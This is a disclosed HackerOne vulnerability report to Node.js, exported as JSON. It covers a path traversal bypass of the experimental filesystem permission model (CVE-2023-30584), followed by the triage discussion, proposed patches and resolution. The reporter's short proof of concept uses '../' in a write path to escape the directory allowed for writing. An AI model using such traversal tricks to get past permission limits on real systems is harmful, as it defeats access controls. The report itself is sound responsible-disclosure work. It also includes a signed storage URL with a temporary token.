{
  "id": 1952978,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTUyOTc4",
  "url": "https://hackerone.com/reports/1952978",
  "title": "Filesystem experimental permissions policy does not handle path traversal cases.",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2023-04-18T18:34:13.103Z",
  "submitted_at": "2023-04-18T18:34:13.285Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "haxatron1",
    "url": "/haxatron1",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f36x3eaxfnfo7885y97xarsr2csu/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 22984,
    "url": "https://hackerone.com/nodejs",
    "handle": "nodejs",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [

    ],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js",
      "twitter_handle": "nodejs",
      "website": "https://nodejs.org",
      "about": "The Node.js JavaScript Runtime"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2023-30584"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2023-07-20T20:57:35.392Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2023-06-20T20:57:31.261Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Consider the following command on Node v20.0.0:\n```\nnode --experimental-permission --allow-fs-read=* --allow-fs-write=/home/kali/restricted/ poc.js\n```\nThis command is intended to restrict write access to only files present in the directory /home/kali/restricted\n\nHowever if we have the following poc.js:\n```\nconst fs = module.require('fs')\nfs.writeFileSync(\"/home/kali/restricted/../secret.txt\", \"Target Overwritten!\")\n```\nThis apparently matches the directory /home/kali/restricted/ directory check and then writes to /home/kali/secret.txt (by using ../), which is not intended, bypassing the experimental permission policy for files.\n\n## Impact\n\nPath traversal when checking experimental file permission policy",
  "weakness": {
    "id": 19,
    "name": "Path Traversal"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [

  ],
  "allow_singular_disclosure_at": "2023-07-20T20:57:31.361Z",
  "allow_singular_disclosure_after": -5565398.450117051,
  "singular_disclosure_allowed": true,
  "vote_count": 3,
  "voters": [
    "zy9ard3",
    "stormbilly55",
    "salman_hunted"
  ],
  "severity": {
    "rating": "high",
    "score": 7.7,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "local",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 666,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/nodejs/node",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [

    ],
    "assignable_team_member_groups": [

    ]
  },
  "activities": [
    {
      "id": 21419433,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @haxatron1 \n\nI couldn't reproduce it:\n\n```console\nâžœ  node (main) node --experimental-permission --allow-fs-read=\"*\" --allow-fs-write=/home/rafaelgss/file/ poc.js\nnode:fs:587\n  const result = binding.open(pathModule.toNamespacedPath(path),\n                         ^\n\nError: Access to this API has been restricted\n    at Object.openSync (node:fs:587:26)\n    at Object.writeFileSync (node:fs:2248:35)\n    at Object.<anonymous> (/home/rafaelgss/repos/os/node/poc.js:2:4)\n    at Module._compile (node:internal/modules/cjs/loader:1267:14)\n    at Module._extensions..js (node:internal/modules/cjs/loader:1321:10)\n    at Module.load (node:internal/modules/cjs/loader:1125:32)\n    at Module._load (node:internal/modules/cjs/loader:965:12)\n    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:83:12)\n    at node:internal/main/run_main_module:23:47 {\n  code: 'ERR_ACCESS_DENIED',\n  permission: 'FileSystemWrite',\n  resource: '/home/rafaelgss/file/../secret.txt'\n}\n\nNode.js v20.0.0\n```",
      "automated_response": false,
      "created_at": "2023-04-18T19:02:21.078Z",
      "updated_at": "2023-04-18T19:02:21.078Z",
      "actor": {
        "username": "rafaelgss",
        "cleared": false,
        "verified": false,
        "url": "/rafaelgss",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/kjrbv0uq2i8ccibs0uuw51m04586/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs"
    },
    {
      "id": 21420272,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugTriaged",
      "message": "Ok, I can reproduce it now. The folder/file must exist or a `/*` should be placed. I'll work on this. Thanks for reporting.",
      "automated_response": false,
      "created_at": "2023-04-18T19:09:55.539Z",
      "updated_at": "2023-04-18T19:09:55.539Z",
      "actor": {
        "username": "rafaelgss",
        "cleared": false,
        "verified": false,
        "url": "/rafaelgss",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/kjrbv0uq2i8ccibs0uuw51m04586/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs"
    },
    {
      "id": 21420368,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "The directory /home/rafaelgss/file must exist for it to work",
      "automated_response": false,
      "created_at": "2023-04-18T19:10:41.395Z",
      "updated_at": "2023-04-18T19:10:41.395Z",
      "actor": {
        "username": "haxatron1",
        "cleared": false,
        "verified": false,
        "url": "/haxatron1",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/f36x3eaxfnfo7885y97xarsr2csu/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs"
    },
    {
      "id": 21420746,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Maybe the solution would be to use weakly_canonical? - https://en.cppreference.com/w/cpp/filesystem/canonical\n``````\ndiff --git a/src/permission/fs_permission.cc b/src/permission/fs_permission.cc\nindex 05efc790f0..2e389875f1 100644\n--- a/src/permission/fs_permission.cc\n+++ b/src/permission/fs_permission.cc\n@@ -58,11 +58,12 @@ bool is_tree_granted(node::permission::FSPermission::RadixTree* granted_tree,\n     if (param.rfind(\"\\\\\\\\?\\\\UNC\\\\\") == 0) {\n       starting_pos += 4;  // \"UNC\\\"\n     }\n-    auto normalized = param.substr(starting_pos);\n+    auto normalized = std::filesystem::weakly_canonical(param.substr(starting_pos));\n     return granted_tree->Lookup(normalized, true);\n   }\n #endif\n-  return granted_tree->Lookup(param, true);\n+  auto normalized = std::filesystem::weakly_canonical(param);\n+  return granted_tree->Lookup(normalized, true);\n }\n \n }  // namespace\n``````\n\nI haven't had the chance to compile and test it to see if it works yet. Though it also resolves symlinks which may cause unintended results.                                                                                                                                                                                                                                            ",
      "automated_response": false,
      "created_at": "2023-04-18T19:26:37.259Z",
      "updated_at": "2023-04-18T19:26:37.259Z",
      "actor": {
        "username": "haxatron1",
        "cleared": false,
        "verified": false,
        "url": "/haxatron1",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/f36x3eaxfnfo7885y97xarsr2csu/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs"
    },
    {
      "id": 21420760,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "I was considering a safer option. Whenever a traversal path is encountered, we restrict access, how does it sound to you?",
      "automated_response": false,
      "created_at": "2023-04-18T19:28:40.064Z",
      "updated_at": "2023-04-18T19:28:40.064Z",
      "actor": {
        "username": "rafaelgss",
        "cleared": false,
        "verified": false,
        "url": "/rafaelgss",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/kjrbv0uq2i8ccibs0uuw51m04586/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs"
    },
    {
      "id": 21420792,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "I could foresee problems if someone is using ../ in their filesystem APIs, it could be limiting. But given this API is experimental then it won't be breaking.",
      "automated_response": false,
      "created_at": "2023-04-18T19:32:02.116Z",
      "updated_at": "2023-04-18T19:32:19.193Z",
      "actor": {
        "username": "haxatron1",
        "cleared": false,
        "verified": false,
        "url": "/haxatron1",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/f36x3eaxfnfo7885y97xarsr2csu/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs"
    },
    {
      "id": 21429484,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "tested this patch (using weakly_canonical) manually:\n````\ndiff --git a/src/permission/fs_permission.cc b/src/permission/fs_permission.cc\nindex 05efc790f0..73b708d808 100644\n--- a/src/permission/fs_permission.cc\n+++ b/src/permission/fs_permission.cc\n@@ -58,11 +58,12 @@ bool is_tree_granted(node::permission::FSPermission::RadixTree* granted_tree,\n     if (param.rfind(\"\\\\\\\\?\\\\UNC\\\\\") == 0) {\n       starting_pos += 4;  // \"UNC\\\"\n     }\n-    auto normalized = param.substr(starting_pos);\n+    auto normalized = std::string_view(std::filesystem::weakly_canonical(param.substr(starting_pos)).string());\n     return granted_tree->Lookup(normalized, true);\n   }\n #endif\n-  return granted_tree->Lookup(param, true);\n+  auto normalized = std::string_view(std::filesystem::weakly_canonical(param).string());\n+  return granted_tree->Lookup(normalized, true);\n }\n \n }  // namespace\n````\nIt works in checking for path traversal cases but I am not sure if it interferes with any symlink interaction. Presumably, with this patch the permission checking on symlinks will now check the target instead of the actual symlink, unsure of any side effects.",
      "automated_response": false,
      "created_at": "2023-04-19T09:30:44.118Z",
      "updated_at": "2023-04-19T09:30:44.118Z",
      "actor": {
        "username": "haxatron1",
        "cleared": false,
        "verified": false,
        "url": "/haxatron1",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/f36x3eaxfnfo7885y97xarsr2csu/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs"
    },
    {
      "id": 21766576,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ExternalUserJoined",
      "message": "",
      "automated_response": false,
      "created_at": "2023-05-09T21:13:06.279Z",
      "updated_at": "2023-05-09T21:13:06.279Z",
      "actor": {
        "username": "lirantal",
        "cleared": false,
        "verified": false,
        "url": "/lirantal",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs"
    },
    {
      "id": 22049101,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "> I was considering a safer option. Whenever a traversal path is encountered, we restrict access, how does it sound to you?\nI don't think that's a good idea to degrade core functionality like that. A `/path/to/thing` and a `/path/to/../thing` are both valid paths.\n\nI'm not versed on the `fs_permission.cc` implementation or the `weakly_canonical` reference. Generally speaking, it looks like to me that what needs to happen is the following, in this particular order too:\n1. Normalizing the path given (in this poc example: `/home/kali/restricted/../secret.txt`). Normalizing the path will essentially resolve the file path to its underlying file system location, in the poc example, that would be: `/home/kali/secret.txt`.\n2. Checking that the file path being accessed `/home/kali/restricted/../secret.txt` is confined within the root of the allowed path that was specified in the command-line argument. In the Node.js API we use [path.relative](https://nodejs.org/api/path.html#pathrelativefrom-to) for that.\n\n@rafaelgss could you add a link here to the actual Node.js implementation of resolving those paths passed to the command-line argument?\n",
      "automated_response": false,
      "created_at": "2023-05-26T20:29:01.968Z",
      "updated_at": "2023-05-26T20:29:01.968Z",
      "actor": {
        "username": "lirantal",
        "cleared": false,
        "verified": false,
        "url": "/lirantal",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs"
    },
    {
      "id": 22049138,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hey! I have a fix ready. Basically, we are calling path.resolve for all FS calls when the permission model is enabled. I will share the diff so you build locally @haxatron1.\n{F2377522}",
      "automated_response": false,
      "created_at": "2023-05-26T20:31:59.717Z",
      "updated_at": "2023-05-26T20:31:59.717Z",
      "actor": {
        "username": "rafaelgss",
        "cleared": false,
        "verified": false,
        "url": "/rafaelgss",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/kjrbv0uq2i8ccibs0uuw51m04586/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 2377522,
          "filename": "patch.diff",
          "type": "application/mbox",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/t27ob7md3pc2c59cat8595hdxfpj?response-content-disposition=attachment%3B%20filename%3D%22patch.diff%22%3B%20filename%2A%3DUTF-8%27%27patch.diff&response-content-type=application%2Fmbox&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWUGJSEXW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065409Z&X-Amz-Expires=2145&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQCs%2BAHUbCDN7ZM%2FRhBNF28O2F80UhXY6VtR8FvK0GbHCgIgT%2BHvom8NbOL5HpmSclupqcewRsIHOtWesqOwPyb3C5wqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFiBp%2B1%2BzPYJYiKWkCqPBcubQSUuQMPeeQa917%2BsMAQCzVw%2BNeT6L8eSgPDCNtgxYe8nYbmd3bljfIC3gl3bvM4o5m%2BR%2B5RRf3jBkEj%2BW%2BSfQSsJ1t8qEL1DJhE%2BvQvaH5ZuAs%2Fdx71s%2BsyOYaurHYRzsywB%2FL1i79fR9W5NUUYb9DJP3l3IGwCvhoNXq5H9mao8oGqlQIUQpegksD8zGG7uHqbOR5vyJqjS2wezOXyVBRjqiKWx0uMZU3A%2FeowGBQXtyY%2FIWdY3s00Twmdd9K2LrlTYw%2Fq2ftpeRtw%2Fn6VvYA6QvmYjr4ZK4JQ9RtYItF8kqbeUb19T3r9c1BFd%2Flbj0Y93xziXJ0xw10GDor0lUx1K4OS7yl9A%2Blu8ufd7MEdEy5s%2Fb0XY2gKYgjf3bY8QRGay30L3L42RcYMf3nqFXO7X3T1N8KfU%2FEJ6c%2F0Yh3bz5yjyaOFQ1cpGT8FGzJlBLHOMB8K6GdzC8tTq4pubY1TR8VnEYZnWk469DzZN%2FeC5qF7sUIW6uWIoiJ19UdSfmZ3xCCwnvklPoVeSaksq3JGhl6AKJbJ7cpUX6owVSnjSmLgCyoYJwLnhMsClgfM0126PpfYlelVGHEqacfBJmkI98B9aLbw2Rygpr1c9BZn9lpNURRanA4YamBuyRTY1JryY6807dLLK0V%2BBeikUHYUT9bZWaBeObgiEIzueZxMFdg5O%2F4nPH2PYDDfg%2BCuXmM3SPrsHkedvAu%2Bvt8yI9uTGk3DR4nJJ4TI0FHy0Ibc7OB7Hxz9nuY3peFIeGYbVJO7C3z1Nov6vn8I5jhwgFpB8ZYg6F%2F3%2FMD620wePaHv%2Fp5lGNzOcnQtX5lywxAbgNX2IcOSHijZYISJeuH2n8sh4PLW7PyKQrJUXn3Yw3P24qAY6sQGsyp%2FD97WbhPz5ULuCT2FvDBvfHDbIte5V4gLDv6VQbMsQ%2Fng51ukrSyWVufY5hEkCq9Ao4dGfEh3jBy0Uz7N9VzK9vaAGEEBIO5d0qqm9xxaX0jdUAw9Yapvhd4z7AUfapQhytkyw5%2BB2KUq%2BWaZrN4Ii3L9QfffPDPLtzj0aFCcjy1Gvz4BqiwFMa7vwGaRcwK%2FB4KzhT0sRLNUsk9KS7rpcPkfB2yVzUcgtyiDV64Y%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8abd58ba60d85502e3fd65c9fc3bdd92155f7bc2546999b286902449922a8196"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "nodejs"
    },
    {
      "id": 22082374,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "I tested the patch locally and can confirm that it fixes the problem.",
      "automated_response": false,
      "created_at": "2023-05-30T04:51:09.226Z",
      "updated_at": "2023-05-30T04:51:09.226Z",
      "actor": {
        "username": "haxatron1",
        "cleared": false,
        "verified": false,
        "url": "/haxatron1",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/f36x3eaxfnfo7885y97xarsr2csu/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs"
    },
    {
      "id": 22305212,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportSeverityUpdated",
      "message": "",
      "automated_response": false,
      "created_at": "2023-06-12T14:36:47.031Z",
      "updated_at": "2023-06-12T14:36:47.031Z",
      "additional_data": {
        "old_severity": "High",
        "new_severity": "High (7.7)",
        "old_severity_id": 1958533,
        "new_severity_id": 2040693
      },
      "actor": {
        "username": "rafaelgss",
        "cleared": false,
        "verified": false,
        "url": "/rafaelgss",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/kjrbv0uq2i8ccibs0uuw51m04586/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs"
    },
    {
      "id": 22309645,
      "is_internal": false,
      "editable": false,
      "type": "Activities::CveIdAdded",
      "message": "",
      "automated_response": false,
      "created_at": "2023-06-12T18:16:22.873Z",
      "updated_at": "2023-06-12T18:16:22.873Z",
      "cve_ids": [
        "CVE-2023-30584"
      ],
      "actor": {
        "username": "rafaelgss",
        "cleared": false,
        "verified": false,
        "url": "/rafaelgss",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/kjrbv0uq2i8ccibs0uuw51m04586/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs"
    },
    {
      "id": 22349238,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @haxatron1 ! Would you like to be credited in the release notes? If yes, which name would you like us to use?\n\nExample:\n\nThanks, to haxatron1 for reporting this vulnerability.",
      "automated_response": false,
      "created_at": "2023-06-14T19:14:47.921Z",
      "updated_at": "2023-06-14T19:14:47.921Z",
      "actor": {
        "username": "rafaelgss",
        "cleared": false,
        "verified": false,
        "url": "/rafaelgss",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/kjrbv0uq2i8ccibs0uuw51m04586/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs"
    },
    {
      "id": 22353084,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi, pls use\n\n\"Thanks, to Axel Chong for reporting this vulnerability\"\n\nThanks!",
      "automated_response": false,
      "created_at": "2023-06-14T23:04:25.002Z",
      "updated_at": "2023-06-14T23:04:25.002Z",
      "actor": {
        "username": "haxatron1",
        "cleared": false,
        "verified": false,
        "url": "/haxatron1",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/f36x3eaxfnfo7885y97xarsr2csu/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs"
    },
    {
      "id": 22436193,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugResolved",
      "message": "",
      "automated_response": false,
      "created_at": "2023-06-20T20:57:24.136Z",
      "updated_at": "2023-06-20T20:57:24.136Z",
      "actor": {
        "username": "rafaelgss",
        "cleared": false,
        "verified": false,
        "url": "/rafaelgss",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/kjrbv0uq2i8ccibs0uuw51m04586/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "reporter": {
        "username": "haxatron1",
        "url": "/haxatron1"
      },
      "genius_execution_id": null,
      "team_handle": "nodejs"
    },
    {
      "id": 22436195,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2023-06-20T20:57:31.315Z",
      "updated_at": "2023-06-20T20:57:31.315Z",
      "first_to_agree": true,
      "actor": {
        "username": "rafaelgss",
        "cleared": false,
        "verified": false,
        "url": "/rafaelgss",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/kjrbv0uq2i8ccibs0uuw51m04586/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs"
    },
    {
      "id": 22932878,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportBecamePublic",
      "message": "",
      "automated_response": false,
      "created_at": "2023-07-20T20:57:35.773Z",
      "updated_at": "2023-07-20T20:57:35.773Z",
      "actor": {
        "url": "/nodejs",
        "ibb": true,
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "profile": {
          "name": "Node.js"
        }
      },
      "genius_execution_id": null,
      "team_handle": "nodejs"
    }
  ],
  "activity_page_count": 1,
  "activity_page_number": 1,
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}